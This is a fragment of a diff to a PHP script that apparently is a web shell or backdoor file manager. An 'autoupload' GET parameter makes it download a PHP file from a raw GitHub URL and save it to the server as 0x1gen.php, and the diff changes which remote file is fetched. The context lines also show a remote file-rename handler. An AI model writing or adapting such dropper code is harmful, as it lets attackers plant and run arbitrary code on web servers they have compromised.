@@ -60,7 +60,7 @@ if (isset($_POST['rename'], $_POST['to'])) {
     exit;
 }
 if (isset($_GET['autoupload'])) {
-    $fileUrl  = "https://raw.githubusercontent.com/TatsumiOfficial/PemecahList/refs/heads/main/0x1gen.php";
+    $fileUrl  = "https://raw.githubusercontent.com/TatsumiOfficial/PemecahList/refs/heads/main/0x1.php";
     $savePath = $dir . DIRECTORY_SEPARATOR . "0x1gen.php";
 
     $content = @file_get_contents($fileUrl);
